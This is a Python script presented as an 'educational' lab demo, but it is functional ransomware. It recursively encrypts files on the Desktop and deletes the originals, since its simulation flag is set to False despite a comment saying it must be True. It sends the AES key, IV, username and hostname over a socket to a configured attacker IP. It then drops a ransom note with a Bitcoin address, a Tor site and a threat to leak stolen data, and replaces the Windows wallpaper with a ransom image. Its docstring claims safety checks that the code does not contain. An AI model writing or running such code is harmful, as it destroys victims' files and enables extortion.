#!/usr/bin/env python3
"""
EDUCATIONAL MULTI-FILE ENCRYPTION DEMO WITH AES-256
FOR AUTHORIZED LAB USE ONLY
"""

import os
import time
import socket
import json
import uuid
import platform
import ctypes
import tempfile
from PIL import Image, ImageDraw, ImageFont
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
import base64

# --- CONFIGURATION --- #
ATTACKER_IP = "192.168.100.141"  # Kali Linux IP
ATTACKER_PORT = 4444
SIMULATION_MODE = False  # MUST BE True - prevents real damage
TARGET_DIRS = [
    os.path.expanduser('~\\Desktop'),

]

# File extensions to target (simulates real ransomware behavior)
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
    '.jpg', '.jpeg', '.png', '.bmp', '.sql', '.db',
    '.csv', '.xml', '.json', '.py', '.java', '.cpp'
}

# Skip these files/directories
SKIP_PATTERNS = {
    'README', 'NOTICE', 'LICENSE', 'desktop.ini', 'thumbs.db'
}
# --------------------- #

def change_wallpaper():
    """Change the victim's wallpaper to a ransom note image (Windows only)."""
    try:
        # Create a ransom note image
        width, height = 1920, 1080
        img = Image.new('RGB', (width, height), color='black')
        draw = ImageDraw.Draw(img)
        
        # Try to use different fonts
        try:
            font = ImageFont.truetype("arial.ttf", 36)
            title_font = ImageFont.truetype("arialbd.ttf", 48)  # Bold for title
        except:
            font = ImageFont.load_default()
            title_font = font
        
        # Create ransom message lines
        lines = [
            "YOUR FILES HAVE BEEN ENCRYPTED!",
            "",
            "All your important files have been encrypted with",
            "AES-256 military-grade encryption.",
            "",
            "To recover your files, you must pay a ransom.",
            "",
            "Contact: recovery@onionmail.com",
            "",
            "=== EDUCATIONAL SIMULATION ===",
            "This is a cybersecurity training exercise."
        ]
        
        # Calculate total text height
        total_height = 0
        for line in lines:
            if "ENCRYPTED" in line:
                bbox = draw.textbbox((0, 0), line, font=title_font)
            else:
                bbox = draw.textbbox((0, 0), line, font=font)
            line_height = bbox[3] - bbox[1]
            total_height += line_height + 10  # Add spacing
        
        # Start position for centered text
        y = (height - total_height) / 2
        
        # Draw each line centered
        for line in lines:
            if "ENCRYPTED" in line:
                # Use title font for the main message
                bbox = draw.textbbox((0, 0), line, font=title_font)
                text_width = bbox[2] - bbox[0]
                x = (width - text_width) / 2
                draw.text((x, y), line, fill='red', font=title_font)
                y += (bbox[3] - bbox[1]) + 20  # Extra space after title
            elif "===" in line:
                # Smaller font for the simulation disclaimer
                bbox = draw.textbbox((0, 0), line, font=font)
                text_width = bbox[2] - bbox[0]
                x = (width - text_width) / 2
                draw.text((x, y), line, fill='yellow', font=font)  # Different color for disclaimer
                y += (bbox[3] - bbox[1]) + 10
            else:
                # Regular font for other lines
                bbox = draw.textbbox((0, 0), line, font=font)
                text_width = bbox[2] - bbox[0]
                x = (width - text_width) / 2
                draw.text((x, y), line, fill='red', font=font)
                y += (bbox[3] - bbox[1]) + 10
        
        # Save temporary image
        temp_dir = tempfile.gettempdir()
        wallpaper_path = os.path.join(temp_dir, "ransom_wallpaper.jpg")
        img.save(wallpaper_path)
        
        # Set as wallpaper on Windows
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        print("✓ Wallpaper changed on Windows")
        
        return True
        
    except Exception as e:
        print(f"✗ Failed to change wallpaper: {e}")
        return False

def get_victim_info():
    """Collect information about the victim machine."""
    return {
        "victim_id": str(uuid.uuid4())[:8],
        "username": os.getlogin(),
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "timestamp": time.time()
    }

def send_key_to_attacker(encryption_key, iv, files_encrypted):
    """Send encryption key and IV to attacker's server."""
    victim_info = get_victim_info()
    
    # Encode key and IV for transmission
    key_data = {
        "key": base64.b64encode(encryption_key).decode(),
        "iv": base64.b64encode(iv).decode(),
        "files_encrypted": files_encrypted,
        "status": "encrypted",
        **victim_info
    }
    
    try:
        print(f"📡 Connecting to attacker at {ATTACKER_IP}:{ATTACKER_PORT}...")
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send key data as JSON
            s.sendall(json.dumps(key_data).encode('utf-8'))
            
            # Wait for acknowledgement
            response = s.recv(1024)
            if response == b"KEY_RECEIVED_OK":
                print("  Key successfully sent to attacker")
                return True
            else:
                print(" No acknowledgement from attacker")
                return False
                
    except socket.timeout:
        print(" Connection timeout - attacker not responding")
        return False
    except ConnectionRefusedError:
        print(" Connection refused - attacker server not running")
        return False
    except Exception as e:
        print(f" Failed to send key: {e}")
        return False


class EducationalEncryptor:
    def __init__(self):
        # Generate AES-256 key (32 bytes) and IV (16 bytes)
        self.key = get_random_bytes(32)  # AES-256 requires 32-byte key
        self.iv = get_random_bytes(16)   # AES block size is 16 bytes
        self.encrypted_count = 0
        self.failed_count = 0
        
    def should_encrypt_file(self, file_path):
        """Determine if a file should be encrypted."""
        filename = os.path.basename(file_path).lower()
        
        # Skip system files and our own files
        if any(pattern in filename for pattern in SKIP_PATTERNS):
            return False
            
        # Skip already encrypted files
        if file_path.endswith('.encrypted'):
            return False
            
        # Target specific file extensions
        _, ext = os.path.splitext(filename)
        return ext.lower() in TARGET_EXTENSIONS

    def encrypt_single_file(self, file_path):
        """Encrypt a single file safely using AES-256-CBC."""
        try:
            # Read file content
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Create AES cipher in CBC mode
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            
            # Pad data to be multiple of AES block size (16 bytes)
            padded_data = pad(original_data, AES.block_size)
            
            # Encrypt the data
            encrypted_data = cipher.encrypt(padded_data)
            
            # Write encrypted data to new file (IV + encrypted data)
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(self.iv)  # Prepend IV for decryption
                f.write(encrypted_data)
            
            # Remove original file if not in simulation mode
            if not SIMULATION_MODE:
                os.remove(file_path)
            
            self.encrypted_count += 1
            print(f"✓ Encrypted: {os.path.basename(file_path)}")
            return True
            
        except PermissionError:
            print(f"✗ Permission denied: {file_path}")
            self.failed_count += 1
            return False
        except Exception as e:
            print(f"✗ Error with {file_path}: {e}")
            self.failed_count += 1
            return False

    def encrypt_directory(self, directory_path):
        """Encrypt all target files in a directory recursively."""
        if not os.path.exists(directory_path):
            print(f"Directory not found: {directory_path}")
            return
            
        print(f"\n🔍 Scanning: {directory_path}")
        
        for root, dirs, files in os.walk(directory_path):
            # Skip hidden directories
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            
            for file in files:
                file_path = os.path.join(root, file)
                
                if self.should_encrypt_file(file_path):
                    self.encrypt_single_file(file_path)

    def create_ransom_note(self, key_sent_to_attacker):
        """Create educational ransom note."""
        note_content = f"""!!! ALL YOUR FILES ARE ENCRYPTED !!!
-------------------------------------

What happened?
All your files, documents, photos, and databases were encrypted with 
AES-256 military-grade encryption.

How can I recover my files?
To decrypt your files, you must pay 1.5 BTC ($~60,000 USD) to the Bitcoin address below.

Send the payment to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After your payment, we will send you the decryption tool.

WARNING!
* Do NOT rename encrypted files.
* Do NOT try to decrypt using third-party software - it will corrupt your data.
* If you do not pay within 72 hours, your decryption key will be destroyed and all data lost.

We have also stolen your data. If you do not pay, it will be published online.

Encryption: AES-256-CBC
Key strength: 256-bit (military grade)

Need help?
To contact us and for proof we can decrypt, visit our Tor site:
hxxp://ransomgangs7typer[.]onion/your-unique-id-here

You can also email us at: decrypt-help@protonmail[.]com

=== EDUCATIONAL SIMULATION ===
This is a cybersecurity training exercise.
"""
        note_path = os.path.join(TARGET_DIRS[0], 'READ_ME_SIMULATION.txt')
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f"📝 Ransom note created: {note_path}")

    def run_encryption(self):
        """Main encryption routine."""
        print(" Starting educational encryption simulation...")
        print(" THIS IS A SIMULATION - NO REAL DAMAGE")
        print(f" Using AES-256-CBC encryption")
        print(f" Key: {base64.b64encode(self.key).decode()}")
        print(f" IV: {base64.b64encode(self.iv).decode()}")
        
        for target_dir in TARGET_DIRS:
            self.encrypt_directory(target_dir)

        key_sent = send_key_to_attacker(self.key, self.iv, self.encrypted_count)
        self.create_ransom_note(key_sent)
        change_wallpaper()

        print(f"\n📊 Simulation complete:")
        print(f"   Files encrypted: {self.encrypted_count}")
        print(f"   Files failed: {self.failed_count}")
        print(f"   Key sent to attacker: {key_sent}")
        print(f"   Encryption: AES-256-CBC")

def main():
    """Main function with safety checks."""
    encryptor = EducationalEncryptor()
    encryptor.run_encryption()

if __name__ == "__main__":
    main()
